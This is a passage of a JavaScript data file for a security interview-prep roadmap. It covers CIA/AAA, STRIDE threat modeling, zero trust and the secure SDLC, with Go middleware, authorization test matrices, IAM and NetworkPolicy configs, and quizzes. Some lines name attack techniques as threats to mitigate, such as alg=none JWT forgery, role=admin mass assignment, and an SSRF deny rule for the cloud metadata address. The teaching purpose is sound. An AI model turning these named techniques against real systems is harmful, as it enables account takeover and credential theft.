// Application & Cloud Security roadmap — AuthN, AuthZ, OAuth2/OIDC, SAML/SSO, JWT, sessions,
// RBAC/ABAC/ReBAC, cryptography, TLS/PKI, mTLS and zero-trust service security.
// Schema: see CONTRIBUTING.md. Long text uses template literals (escape ` and ${ inside them).
registerRoadmap({
  id: 'security',
  order: 40,
  title: 'Application & Cloud Security',
  short: 'Security',
  icon: '🔐',
  color: '#EF4444',
  desc: 'AuthN, AuthZ, OAuth2/OIDC, SAML/SSO, JWT, sessions, RBAC, TLS/mTLS, PKI and secure-by-design services.',
  unit: 'Module',
  modules: [
    // ───────────────────────────────────────────── Module 1 ─────────────────────────────────────────────
    {
      n: 1,
      title: 'Security Foundations',
      summary: `The mental models every security discussion starts from: what we protect (CIA), how access is controlled (AuthN / AuthZ / accounting), how to find threats before attackers do (STRIDE threat modeling), and the design principles (defense in depth, least privilege, zero trust, minimal attack surface) that interviewers expect a senior engineer to apply by default.`,
      topics: [
        {
          title: 'CIA Triad and AAA (AuthN vs AuthZ vs Accounting)',
          def: `<p>The <strong>CIA triad</strong> defines what security protects:</p>
<ul>
<li><strong>Confidentiality</strong> — only authorized parties can read data (encryption in transit and at rest, access control, data minimization, masking in logs).</li>
<li><strong>Integrity</strong> — data and code are not modified undetected (hashes, MACs, digital signatures, DB constraints, signed artifacts, append-only audit logs).</li>
<li><strong>Availability</strong> — the system is usable when needed (redundancy, rate limiting, quotas, timeouts, DDoS protection, tested backups).</li>
</ul>
<p>It is often extended with <strong>authenticity</strong> (data really came from the claimed source) and <strong>non-repudiation</strong> (an actor cannot plausibly deny an action). Non-repudiation needs <em>asymmetric</em> signatures plus trustworthy logs — an HMAC cannot provide it because both parties hold the same key.</p>
<p><strong>AAA</strong> describes how access is controlled:</p>
<table>
<thead><tr><th>Concept</th><th>Question</th><th>Mechanisms</th><th>HTTP failure</th></tr></thead>
<tbody>
<tr><td>Authentication (AuthN)</td><td>Who are you?</td><td>password + MFA, passkey, client certificate, OIDC ID token</td><td>401 Unauthorized + <code>WWW-Authenticate</code></td></tr>
<tr><td>Authorization (AuthZ)</td><td>What may you do?</td><td>RBAC roles, OAuth scopes, OPA/Cedar policy, ownership checks</td><td>403 Forbidden (or 404 to hide existence)</td></tr>
<tr><td>Accounting / Audit</td><td>What did you do?</td><td>audit logs, CloudTrail, Kubernetes audit log, SIEM</td><td>—</td></tr>
</tbody>
</table>
<p>Nuances interviewers like: <strong>identification</strong> (claiming an identity, e.g. typing a username) differs from <strong>authentication</strong> (proving it). Authorization requires a <em>verified</em> identity and must be evaluated on <strong>every request, for every object</strong> — a valid session proves who you are, not that you may read invoice 42. Availability failures (unbounded queries, ReDoS, missing rate limits) are security bugs, not just performance bugs.</p>`,
          interview: 'Expect: 401 vs 403 semantics, why HMAC cannot give non-repudiation, why authorization must be checked per object (not just per route), and why availability (rate limits, resource exhaustion) is a security property. Tie each CIA property to a concrete control you have built or tested.',
          examples: [
            {
              label: '401 (not authenticated) vs 403 (authenticated, not allowed)',
              lang: 'http',
              code: `GET /api/invoices/42 HTTP/1.1
Host: api.example.com

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="api", error="invalid_token", error_description="token expired"

---

GET /api/invoices/42 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJFUzI1NiIs...   (valid token for user u-17, invoice belongs to u-99)

HTTP/1.1 403 Forbidden            (or 404 Not Found to avoid confirming the invoice exists)
Content-Type: application/problem+json

{"type":"about:blank","title":"Forbidden","status":403}`
            }
          ]
        },
        {
          title: 'Threat Modeling with STRIDE',
          def: `<p>Threat modeling is structured thinking about what can go wrong <em>before</em> code ships. Adam Shostack's four questions frame it: <strong>What are we building? What can go wrong? What are we going to do about it? Did we do a good job?</strong></p>
<ol>
<li>Draw a <strong>data-flow diagram</strong>: external entities, processes, data stores, data flows.</li>
<li>Mark <strong>trust boundaries</strong> — where data crosses privilege levels (internet &rarr; gateway, service &rarr; database, tenant A &rarr; shared worker, CI &rarr; production).</li>
<li>Apply <strong>STRIDE</strong> to each element and each flow that crosses a boundary.</li>
<li>Rank risk (likelihood &times; impact) and decide: mitigate, eliminate, transfer or accept (documented).</li>
<li>Turn mitigations into tickets <em>and tests</em>; revisit the model when the design changes.</li>
</ol>
<table>
<thead><tr><th>Threat</th><th>Violates</th><th>Example</th><th>Typical mitigation</th></tr></thead>
<tbody>
<tr><td><strong>S</strong>poofing</td><td>Authenticity</td><td>stolen session cookie, forged JWT</td><td>strong AuthN, MFA/passkeys, mTLS, signature validation</td></tr>
<tr><td><strong>T</strong>ampering</td><td>Integrity</td><td>editing <code>price</code> in a request, MITM</td><td>TLS, MACs/signatures, server-side validation</td></tr>
<tr><td><strong>R</strong>epudiation</td><td>Non-repudiation</td><td>user denies a transfer</td><td>signed, tamper-evident audit logs</td></tr>
<tr><td><strong>I</strong>nformation disclosure</td><td>Confidentiality</td><td>verbose errors, IDOR, public bucket</td><td>authz checks, encryption, error hygiene</td></tr>
<tr><td><strong>D</strong>enial of service</td><td>Availability</td><td>unbounded page size, ReDoS, zip bomb</td><td>rate limits, quotas, timeouts, size caps</td></tr>
<tr><td><strong>E</strong>levation of privilege</td><td>Authorization</td><td>mass-assignment <code>role=admin</code>, container escape</td><td>least privilege, allow-listed fields, sandboxing</td></tr>
</tbody>
</table>
<p>Alternatives and complements: <strong>PASTA</strong> (risk-centric), <strong>LINDDUN</strong> (privacy threats), attack trees, and <strong>MITRE ATT&amp;CK</strong> for real adversary techniques.</p>`,
          interview: 'Interviewers want a repeatable process, not a list of buzzwords: draw the DFD, find trust boundaries, walk STRIDE across boundary-crossing flows, prioritize, and convert mitigations into tests. Have one real example ready (e.g. a login or file-upload service) with 3-4 concrete threats and controls.',
          examples: [
            {
              label: 'Mini threat model: POST /login',
              lang: 'text',
              code: `Asset: user accounts, session tokens
Boundary: Internet -> API gateway -> auth-service -> users DB

S  Credential stuffing with leaked passwords  -> breached-password check, rate limit per IP+account, MFA/passkeys
T  Attacker modifies redirect_to parameter      -> allow-list relative paths only (open-redirect)
R  User disputes "I never logged in from X"     -> audit log: user id, IP, UA, MFA method, result
I  Different error for "no such user" vs "bad password" -> generic error, constant-time compare
D  Argon2 hashing used as CPU DoS               -> rate limit BEFORE hashing, cap concurrent hashes
E  Session id not rotated after login (fixation) -> issue a fresh session id on every privilege change`
            }
          ]
        },
        {
          title: 'Defense in Depth, Least Privilege and Secure Design Principles',
          def: `<p><strong>Defense in depth</strong> layers independent controls so that one failure is not a breach. For a typical Go API on Kubernetes: WAF / DDoS protection &rarr; TLS at the edge &rarr; gateway authentication and rate limiting &rarr; service-level authorization per object &rarr; input validation and parameterized queries &rarr; mTLS between services &rarr; NetworkPolicies &rarr; non-root, read-only, distroless containers &rarr; encrypted storage with KMS &rarr; audit logging and alerting.</p>
<p><strong>Least privilege</strong>: every identity (human, service account, CI job, pod) gets the minimum permissions, for the minimum time, on the minimum resources. In practice: scoped IAM roles per service, Kubernetes <code>Role</code> instead of <code>ClusterRole</code>, short-lived credentials, just-in-time admin elevation, read-only DB users for read paths.</p>
<p>The classic <strong>Saltzer &amp; Schroeder principles</strong> still anchor design reviews:</p>
<ul>
<li><strong>Economy of mechanism</strong> — simple designs are auditable; avoid home-grown crypto and auth.</li>
<li><strong>Fail-safe defaults</strong> — deny by default; on error, fail closed (a crashed policy engine must not mean "allow").</li>
<li><strong>Complete mediation</strong> — check every access, every time; do not cache authorization decisions beyond their validity.</li>
<li><strong>Open design</strong> — security must not rely on secrecy of the design (Kerckhoffs's principle), only of keys.</li>
<li><strong>Separation of privilege / duties</strong> — two-person approval for prod deploys, separate signing and deploy roles.</li>
<li><strong>Least common mechanism</strong> — minimize shared state between tenants and privilege levels.</li>
<li><strong>Psychological acceptability</strong> — secure paths must be easy, or people route around them.</li>
</ul>
<p>Also: <strong>secure defaults</strong> (TLS on, debug off), and reducing <strong>blast radius</strong> (per-tenant keys, cell-based architecture, separate cloud accounts per environment).</p>`,
          interview: 'Be ready to list concrete layers for a real service and to explain fail-closed behavior: what happens when the auth service or policy engine is down? Senior answers mention blast radius, short-lived credentials and separation of duties in CI/CD.',
          examples: [
            {
              label: 'Fail closed: policy errors deny access',
              lang: 'go',
              code: `func authorize(ctx context.Context, pdp PolicyClient, in Input) bool {
    ctx, cancel := context.WithTimeout(ctx, 50*time.Millisecond)
    defer cancel()
    decision, err := pdp.Evaluate(ctx, in)
    if err != nil {
        // Fail-safe default: an unreachable or erroring policy engine is a DENY, never an allow.
        slog.WarnContext(ctx, "authz evaluation failed; denying", "err", err)
        return false
    }
    return decision.Allow
}`
            }
          ]
        },
        {
          title: 'Zero Trust Principles',
          def: `<p><strong>Zero trust</strong> (NIST SP 800-207, Google BeyondCorp) drops the idea that being "inside the network" implies trust. Every request is authenticated, authorized and encrypted based on <strong>identity and context</strong>, not network location.</p>
<p>Core tenets:</p>
<ul>
<li><strong>Never trust, always verify</strong> — each request carries a verifiable identity (user token, workload certificate).</li>
<li><strong>Per-request, per-resource authorization</strong> by a <strong>Policy Decision Point</strong> (PDP), enforced at a <strong>Policy Enforcement Point</strong> (PEP: gateway, sidecar, identity-aware proxy, the service itself).</li>
<li><strong>Context-aware</strong> decisions: user, device posture (managed? patched? disk encrypted?), location, time, risk score.</li>
<li><strong>Assume breach</strong> — microsegmentation, least privilege and monitoring limit lateral movement.</li>
<li><strong>Short-lived, automatically rotated credentials</strong> instead of static keys and VPN-wide access.</li>
</ul>
<p>Concrete building blocks in a cloud-native stack:</p>
<table>
<thead><tr><th>Area</th><th>Implementation</th></tr></thead>
<tbody>
<tr><td>Users</td><td>SSO via OIDC/SAML, phishing-resistant MFA (passkeys), identity-aware proxy instead of VPN</td></tr>
<tr><td>Workloads</td><td>SPIFFE IDs, mTLS via service mesh, cloud workload identity (no static keys)</td></tr>
<tr><td>Network</td><td>Kubernetes NetworkPolicies default-deny, private endpoints</td></tr>
<tr><td>Authorization</td><td>central policy (OPA, Cedar) evaluated per request; mesh AuthorizationPolicy</td></tr>
<tr><td>Visibility</td><td>centralized audit logs, anomaly detection, continuous re-evaluation of sessions</td></tr>
</tbody>
</table>
<p>Zero trust is an <em>architecture and a migration</em>, not a product: start with identity (SSO + MFA everywhere), then device posture, then service-to-service mTLS and per-request policy.</p>`,
          interview: 'A strong answer contrasts perimeter/VPN security with identity-centric access, names PDP/PEP, and gives a concrete microservices implementation (mTLS with SPIFFE identities + per-request authorization + default-deny NetworkPolicies). Avoid saying "zero trust = mTLS"; mTLS is authentication only.',
          examples: [
            {
              label: 'Default-deny NetworkPolicy (micro-segmentation baseline)',
              lang: 'text',
              code: `apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: payments
spec:
  podSelector: {}          # all pods in the namespace
  policyTypes: [Ingress, Egress]
  # no rules => nothing allowed; add explicit allow policies per flow (plus DNS egress)`
            }
          ]
        },
        {
          title: 'Attack Surface and the Secure SDLC',
          def: `<p>The <strong>attack surface</strong> is the sum of entry points an attacker can reach: HTTP/gRPC endpoints, admin and debug ports (<code>/debug/pprof</code>, metrics), message consumers, file uploads, webhooks, CLI flags, environment variables, third-party dependencies, CI pipelines, cloud control-plane permissions and the humans with access.</p>
<p>Reducing it: remove unused endpoints and features, bind admin ports to localhost or a separate listener, use distroless images (no shell), disable default credentials, restrict egress, and keep an API inventory (unknown "shadow" APIs are an OWASP API Top 10 risk).</p>
<p>The <strong>secure SDLC</strong> ("shift left") builds checks into every stage:</p>
<table>
<thead><tr><th>Stage</th><th>Practice</th><th>Go / cloud-native tooling</th></tr></thead>
<tbody>
<tr><td>Design</td><td>threat model, security requirements (OWASP ASVS)</td><td>STRIDE, design review</td></tr>
<tr><td>Code</td><td>SAST, secure libraries, code review</td><td><code>gosec</code>, CodeQL, Semgrep, <code>go vet</code></td></tr>
<tr><td>Dependencies</td><td>SCA with reachability</td><td><code>govulncheck</code>, Dependabot/Renovate</td></tr>
<tr><td>Secrets</td><td>pre-commit and CI scanning</td><td>gitleaks, GitHub push protection</td></tr>
<tr><td>Test</td><td>authz test matrices, fuzzing, DAST</td><td><code>go test -fuzz</code>, OWASP ZAP</td></tr>
<tr><td>Build</td><td>SBOM, signing, provenance</td><td>syft, cosign, SLSA provenance</td></tr>
<tr><td>Deploy / run</td><td>IaC and image scanning, admission policy, runtime detection</td><td>Trivy, Checkov, Kyverno/Gatekeeper, Falco</td></tr>
</tbody>
</table>
<p>For an engineer coming from QA this is a strength: security requirements become <strong>negative test cases</strong> (wrong tenant, expired token, missing scope, oversized body) that run in CI on every change.</p>`,
          interview: 'Mention govulncheck specifically for Go (it reports only vulnerabilities in functions your code actually calls). Show you can translate a threat model into automated negative tests, and that you know debug endpoints like pprof must not be exposed publicly.',
          examples: [
            {
              label: 'Security checks for a Go repo in CI',
              lang: 'bash',
              code: `# Known vulnerabilities reachable from your code (Go vulnerability DB)
go install golang.org/x/vuln/cmd/govulncheck@latest
govulncheck ./...

# Static analysis for common Go security bugs (G101 hardcoded creds, G402 weak TLS, ...)
gosec ./...

# Secrets in git history
gitleaks detect --source . --redact

# Fuzz a parser for 60s (finds panics / unexpected input handling)
go test -run=^$ -fuzz=FuzzParseToken -fuzztime=60s ./internal/auth`
            }
          ]
        }
      ],
      problems: [
        {
          t: 'Classify security incidents by the CIA property they violate',
          d: 'easy',
          type: 'concept',
          hint: `<ul><li>Ask: was data <em>read</em> (confidentiality), <em>changed</em> (integrity) or made <em>unusable</em> (availability)?</li><li>Some incidents hit several properties — ransomware is availability and often confidentiality (double extortion).</li><li>Name a preventive and a detective control for each.</li></ul>`,
          solution: `1. Public S3 bucket exposes customer PII        -> Confidentiality | prevent: Block Public Access, SCPs | detect: config rules
2. Attacker changes order price in request body  -> Integrity       | prevent: server-side pricing      | detect: anomaly alerts
3. Unpaginated /search endpoint OOM-kills pods   -> Availability    | prevent: max page size, timeouts  | detect: SLO alerts
4. Ransomware encrypts DB + leaks dump           -> Availability + Confidentiality | prevent: least privilege, immutable backups
5. Compromised npm/Go module injects backdoor    -> Integrity (supply chain)        | prevent: pinning, checksums (go.sum), signing
6. Forged JWT accepted via alg=none              -> Integrity/Authenticity -> Elevation of privilege`,
          lang: 'text'
        },
        {
          t: 'Return correct 401 vs 403 from Go HTTP middleware',
          d: 'easy',
          type: 'coding',
          hint: `<ul><li>Authentication middleware: missing/invalid credentials &rarr; 401 with a <code>WWW-Authenticate</code> header.</li><li>Authorization happens later, with the resource loaded: authenticated but not allowed &rarr; 403 (or 404 to hide existence).</li><li>Put the verified principal in the request context; never trust identity headers from clients.</li></ul>`,
          solution: `type ctxKey struct{}

func Authenticate(verify func(*http.Request) (*Principal, error)) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            p, err := verify(r) // validates session cookie or bearer token
            if err != nil {
                w.Header().Set("WWW-Authenticate", \`Bearer realm="api", error="invalid_token"\`)
                http.Error(w, "unauthenticated", http.StatusUnauthorized)
                return
            }
            next.ServeHTTP(w, r.WithContext(context.WithValue(r.Context(), ctxKey{}, p)))
        })
    }
}

func (h *Handler) GetInvoice(w http.ResponseWriter, r *http.Request) {
    p := r.Context().Value(ctxKey{}).(*Principal)
    inv, err := h.store.Invoice(r.Context(), r.PathValue("id"))
    if err != nil || inv.TenantID != p.TenantID {
        http.NotFound(w, r) // do not reveal that another tenant's invoice exists
        return
    }
    if !p.Can("invoice:read") {
        http.Error(w, "forbidden", http.StatusForbidden)
        return
    }
    json.NewEncoder(w).Encode(inv)
}`,
          lang: 'go'
        },
        {
          t: 'Apply STRIDE to a password-reset flow',
          d: 'medium',
          type: 'design',
          hint: `<ul><li>Draw the flow: request reset &rarr; email token &rarr; click link &rarr; set new password.</li><li>Spoofing: guessable or long-lived tokens; Information disclosure: account enumeration via different responses.</li><li>Tampering: Host-header poisoning of the reset link; Repudiation: no audit trail.</li><li>DoS: email bombing; EoP: token not bound to the user, sessions not revoked after reset.</li></ul>`,
          solution: `S  Token guessable/reusable      -> 128+ bit random token (crypto/rand), store only SHA-256(token), single use, 15-30 min TTL
T  Host header poisoning         -> build link from configured base URL, never from the request Host header
R  "I didn't reset it"           -> audit log + notify user by email on every reset
I  Account enumeration           -> always respond "If the account exists, we sent an email" with same timing
I  Token leaks via Referer       -> Referrer-Policy: no-referrer on reset page; POST the token, don't keep it in URL after load
D  Email bombing                 -> rate limit per account and per IP, CAPTCHA after threshold
E  Reset bypasses MFA            -> require second factor (or recovery code) for MFA-enabled accounts
E  Old sessions remain valid     -> revoke all sessions and refresh tokens after password change`,
          lang: 'text'
        },
        {
          t: 'Enumerate and reduce the attack surface of a Go microservice',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>List listeners and routes (public API, metrics, pprof, health), consumers (queues, webhooks) and outbound calls.</li><li>Check the container: user, shell, writable FS, capabilities.</li><li>Check Kubernetes exposure: Services, Ingress, NetworkPolicies, ServiceAccount token mount.</li></ul>`,
          solution: `# Listening ports inside the pod (if a debug shell exists; prefer ephemeral debug containers)
kubectl debug -it deploy/orders --image=busybox --target=orders -- netstat -tlnp

# What is exposed outside the cluster?
kubectl get svc,ingress -n orders -o wide

# Is pprof reachable from outside? (should be 404 or bound to a separate localhost listener)
curl -s -o /dev/null -w "%{http_code}\\n" https://api.example.com/debug/pprof/

# Container hardening checks
kubectl get deploy orders -n orders -o jsonpath='{.spec.template.spec.containers[0].securityContext}'
# expect: runAsNonRoot: true, readOnlyRootFilesystem: true, allowPrivilegeEscalation: false, capabilities.drop: [ALL]

# Does the pod need a Kubernetes API token at all?
kubectl get deploy orders -n orders -o jsonpath='{.spec.template.spec.automountServiceAccountToken}'

# Go side: serve pprof/metrics on a separate internal listener
#   go http.ListenAndServe("127.0.0.1:6060", pprofMux)`,
          lang: 'bash'
        },
        {
          t: 'Write an authorization test matrix for a REST API',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Table-driven test: (actor, method, path, expected status).</li><li>Actors: anonymous, user of tenant A, user of tenant B, admin, expired token, token missing scope.</li><li>Include the negative cases — most real vulnerabilities (BOLA/IDOR) live there.</li><li>Run against <code>httptest.NewServer</code> with the real router and middleware.</li></ul>`,
          solution: `func TestAuthorizationMatrix(t *testing.T) {
    srv := httptest.NewServer(newRouter(testDeps(t)))
    defer srv.Close()

    tokens := map[string]string{
        "anon":     "",
        "alice-tA": mintToken(t, "alice", "tenant-a", "invoice:read"),
        "bob-tB":   mintToken(t, "bob", "tenant-b", "invoice:read"),
        "noscope":  mintToken(t, "carol", "tenant-a"),
        "expired":  mintExpired(t, "alice", "tenant-a"),
    }
    cases := []struct {
        actor, method, path string
        want                int
    }{
        {"anon", "GET", "/invoices/inv-a1", 401},
        {"expired", "GET", "/invoices/inv-a1", 401},
        {"alice-tA", "GET", "/invoices/inv-a1", 200},
        {"bob-tB", "GET", "/invoices/inv-a1", 404},   // cross-tenant: BOLA check
        {"noscope", "GET", "/invoices/inv-a1", 403},  // missing scope
        {"alice-tA", "DELETE", "/invoices/inv-a1", 403}, // function-level authz
    }
    for _, tc := range cases {
        t.Run(tc.actor+" "+tc.method+" "+tc.path, func(t *testing.T) {
            req, _ := http.NewRequest(tc.method, srv.URL+tc.path, nil)
            if tok := tokens[tc.actor]; tok != "" {
                req.Header.Set("Authorization", "Bearer "+tok)
            }
            res, err := srv.Client().Do(req)
            if err != nil {
                t.Fatal(err)
            }
            res.Body.Close()
            if res.StatusCode != tc.want {
                t.Fatalf("got %d, want %d", res.StatusCode, tc.want)
            }
        })
    }
}`,
          lang: 'go'
        },
        {
          t: 'Fix a service that leaks stack traces and internal errors',
          d: 'medium',
          type: 'debug',
          hint: `<ul><li>Symptom: 500 responses contain SQL errors, file paths, panic traces.</li><li>Return a generic problem response with a correlation ID; log the details server-side.</li><li>Add panic-recovery middleware; never echo <code>err.Error()</code> to clients.</li></ul>`,
          solution: `func Recover(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        defer func() {
            if v := recover(); v != nil {
                id := requestID(r.Context())
                slog.ErrorContext(r.Context(), "panic", "request_id", id, "panic", v, "stack", string(debug.Stack()))
                writeProblem(w, http.StatusInternalServerError, id)
            }
        }()
        next.ServeHTTP(w, r)
    })
}

func writeProblem(w http.ResponseWriter, status int, id string) {
    w.Header().Set("Content-Type", "application/problem+json")
    w.WriteHeader(status)
    json.NewEncoder(w).Encode(map[string]any{
        "title":      http.StatusText(status),
        "status":     status,
        "request_id": id, // lets support correlate with server logs; reveals nothing internal
    })
}

// BAD:  http.Error(w, err.Error(), 500)   -> "pq: relation \\"users\\" ... /app/internal/db.go:42"
// GOOD: log err with request_id, return writeProblem(w, 500, id)`,
          lang: 'go'
        },
        {
          t: 'Design least-privilege access for a CI/CD pipeline',
          d: 'medium',
          type: 'design',
          hint: `<ul><li>Replace long-lived cloud keys with OIDC federation (GitHub Actions / GitLab &rarr; cloud STS).</li><li>Scope the trust policy to a repository <em>and</em> branch/environment via the token's <code>sub</code> and <code>aud</code> claims.</li><li>Separate roles: build (push image) vs deploy (update cluster) vs infra (Terraform).</li><li>Protected environments with required reviewers = separation of duties.</li></ul>`,
          solution: `{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringEquals": {
        "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
        "token.actions.githubusercontent.com:sub": "repo:acme/orders:environment:production"
      }
    }
  }]
}

Role permissions: ecr:PutImage on the single orders repository, eks:DescribeCluster only.
Kubernetes side: the deploy identity maps to a namespaced Role allowing patch on deployments in "orders" only.
No static AWS keys in CI secrets; credentials expire within an hour.`,
          lang: 'json'
        },
        {
          t: 'Threat model a multi-tenant file-upload service',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Boundaries: browser &rarr; API, API &rarr; object storage, storage &rarr; async processors (thumbnailer, AV scan), processors &rarr; other tenants' data.</li><li>Think: malicious content (polyglots, SVG with script, zip bombs, image-parser exploits), path traversal, SSRF via "import from URL", cross-tenant access, unbounded size.</li><li>Use pre-signed URLs scoped to tenant prefix; serve user content from a separate sandbox domain.</li></ul>`,
          solution: `Data flow: Browser -> API (authn, quota) -> pre-signed PUT URL -> S3 bucket (tenant/{id}/...) -> event -> scanner/thumbnailer (sandboxed) -> metadata DB
Threats & controls:
- Spoofing: upload on behalf of another tenant -> object key derived server-side from verified tenant id, never from client input
- Tampering: overwrite other objects -> pre-signed URL bound to one key, short TTL, content-length-range condition
- Info disclosure: guessable object URLs -> private bucket, short-lived signed GET URLs, authz check before signing
- Info disclosure: stored XSS via SVG/HTML -> serve from separate domain (usercontent.example.net), Content-Disposition: attachment, X-Content-Type-Options: nosniff, CSP sandbox
- DoS: zip/image bombs, huge files -> size limits at URL signing + processor limits on decompressed size/pixels, timeouts
- EoP: image-parser RCE -> processors in gVisor/Firecracker sandbox, no network egress, no credentials beyond read of one object
- SSRF: "import from URL" -> egress proxy with allow-list, block private/link-local IPs incl. 169.254.169.254 after DNS resolution
- Repudiation: audit who uploaded/downloaded what, per tenant
- Cross-tenant blast radius: per-tenant KMS data keys; bucket policy denies access without tenant tag match`,
          lang: 'text'
        },
        {
          t: 'Design zero-trust access for internal admin tools (replace the VPN)',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Put an identity-aware proxy (IAP) in front of every internal app: SSO via OIDC, phishing-resistant MFA, device posture.</li><li>Per-app, per-group authorization at the proxy; apps still validate a signed identity assertion from the proxy.</li><li>Just-in-time elevation for destructive actions; full audit logging.</li><li>Plan the migration incrementally and keep break-glass access.</li></ul>`,
          solution: `1. Identity: all staff in the IdP (Entra ID / Okta), passkeys or FIDO2 keys mandatory for admins; SCIM for joiner/mover/leaver.
2. Device: MDM-managed devices only; posture (OS patch level, disk encryption) fed into access policy.
3. Access path: user -> IAP (Google IAP, Cloudflare Access, Pomerium, oauth2-proxy) -> app over mTLS.
   The proxy injects a signed JWT (e.g. X-Goog-IAP-JWT-Assertion); the app VERIFIES it (iss, aud, sig) instead of trusting headers.
4. Policy: group-based per app (finance-admin only for /billing), re-evaluated per request; session lifetime 8-12h, re-auth for sensitive ops.
5. JIT: elevation requests with approval and auto-expiry (e.g. 1h) for prod write access.
6. Network: apps have no public IPs; only reachable from the proxy (NetworkPolicy / security groups).
7. Audit: who accessed what, from which device; alerts on anomalous access.
8. Break-glass: sealed emergency accounts with hardware keys, alert on every use.`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'Walk me through how you would threat-model a new service.',
          a: `<p>I use the four-question framework and keep it lightweight enough to run in a design review:</p>
<ol>
<li><strong>What are we building?</strong> A data-flow diagram with actors, services, data stores and flows; I mark trust boundaries (internet/gateway, service/DB, tenant/tenant, CI/prod) and classify the data (PII, credentials, payment).</li>
<li><strong>What can go wrong?</strong> STRIDE across each boundary-crossing flow, plus domain-specific abuse cases (e.g. coupon abuse, scraping). I check the OWASP API Top 10 as a completeness list — BOLA, broken authentication, unrestricted resource consumption, SSRF.</li>
<li><strong>What do we do about it?</strong> Rank by likelihood &times; impact; each accepted mitigation becomes a ticket <em>and</em> a test (negative authz cases, rate-limit tests, fuzzing for parsers). Accepted risks are documented with an owner.</li>
<li><strong>Did we do a good job?</strong> Review with a security partner, verify controls in staging, and revisit the model when the architecture changes.</li>
</ol>
<p>I would give a concrete example, e.g. for a file-upload service: tenant-scoped object keys derived server-side, serving uploads from a sandbox domain to avoid stored XSS, sandboxed processors against parser exploits, and SSRF controls for URL imports.</p>`
        },
        {
          q: 'What does zero trust actually mean, and how would you implement it for microservices?',
          a: `<p>Zero trust means network location grants nothing: every request is <strong>authenticated, authorized and encrypted</strong> based on identity and context, decisions are made per request, and we assume the network is already compromised.</p>
<p>For microservices on Kubernetes:</p>
<ul>
<li><strong>Workload identity</strong>: each service gets a cryptographic identity (SPIFFE ID such as <code>spiffe://prod.example.com/ns/orders/sa/orders</code>) issued automatically and rotated hourly (SPIRE or a mesh CA).</li>
<li><strong>mTLS everywhere</strong> via a service mesh (Istio/Linkerd) or go-spiffe — this authenticates both peers and encrypts traffic.</li>
<li><strong>Authorization</strong>: mesh <code>AuthorizationPolicy</code> (orders may call payments on <code>POST /charge</code> only), plus in-service object-level checks using the end-user token propagated or exchanged (RFC 8693).</li>
<li><strong>Segmentation</strong>: default-deny NetworkPolicies; egress restricted.</li>
<li><strong>Credentials</strong>: no static secrets — cloud workload identity, Vault dynamic credentials.</li>
<li><strong>Observability</strong>: audit and anomaly detection on denied requests.</li>
</ul>
<p>Key caveat: mTLS alone is <em>authentication</em>; zero trust also requires per-request <em>authorization</em> and the user context, otherwise any compromised service can call anything.</p>`
        },
        {
          q: 'Where should authentication and authorization be enforced in a microservices architecture?',
          a: `<p><strong>Authentication at the edge, authorization close to the data — and verify identity again inside.</strong></p>
<ul>
<li>The <strong>API gateway</strong> validates the external credential (JWT signature/expiry, session, API key), applies rate limits and coarse checks (route requires scope <code>orders:read</code>). It strips any client-supplied identity headers.</li>
<li>Internal calls carry an identity the services can <strong>verify</strong>: the original access token, a token obtained via token exchange with a narrower audience, or a gateway-signed internal JWT — plus mTLS for the service identity.</li>
<li><strong>Fine-grained authorization</strong> (does user X own order 42? is tenant A allowed?) must happen in the service that owns the data, because only it knows the relationships. Centralize the <em>policy</em> (OPA, Cedar, OpenFGA) but enforce in each service.</li>
</ul>
<p>Anti-patterns: trusting <code>X-User-Id</code> headers set by "the gateway" without verification; doing all authorization in the gateway (leads to BOLA/IDOR); forwarding a broad token to every downstream service (confused deputy).</p>`
        },
        {
          q: 'How do you build security into the SDLC, and what would you test?',
          a: `<p>I treat security requirements as testable requirements:</p>
<ul>
<li><strong>Design</strong>: threat model; security requirements from OWASP ASVS at the right level.</li>
<li><strong>Pre-merge</strong>: SAST (<code>gosec</code>, CodeQL), <code>govulncheck</code> with call-graph reachability, secret scanning, IaC scanning; mandatory review for auth-sensitive code paths (CODEOWNERS).</li>
<li><strong>Tests</strong>: an authorization matrix (every role &times; every endpoint &times; own/foreign object), token edge cases (expired, wrong audience, wrong issuer, <code>alg:none</code>, unknown <code>kid</code>), input limits, CSRF and CORS behavior, fuzz tests for parsers.</li>
<li><strong>Build</strong>: SBOM, signed images (cosign), SLSA provenance; admission policies verify signatures.</li>
<li><strong>Runtime</strong>: DAST against staging, runtime detection, audit logs, alerting; periodic pentests and a bug bounty.</li>
</ul>
<p>The QA mindset is valuable here: most real vulnerabilities are missing <em>negative</em> paths, and an automated regression suite stops them from coming back.</p>`
        }
      ],
      quiz: [
        { q: 'What does the CIA triad stand for?', a: 'Confidentiality, Integrity, Availability.' },
        { q: 'Which HTTP status means "not authenticated" and which means "authenticated but not allowed"?', a: '401 Unauthorized (with WWW-Authenticate) for missing/invalid credentials; 403 Forbidden for insufficient permissions (404 can be used to hide existence).' },
        { q: 'Why can an HMAC not provide non-repudiation?', a: 'Both parties share the same secret key, so either could have produced the MAC; non-repudiation needs an asymmetric signature from a key only the signer holds.' },
        { q: 'What does each letter of STRIDE stand for?', a: 'Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.' },
        { q: 'What is a trust boundary?', a: 'A point in the data flow where data or control passes between different privilege or trust levels, e.g. internet to API gateway or service to database; threats concentrate there.' },
        { q: 'What does "fail closed" mean for an authorization check?', a: 'If the check cannot be evaluated (error, timeout, policy engine down), access is denied rather than allowed.' },
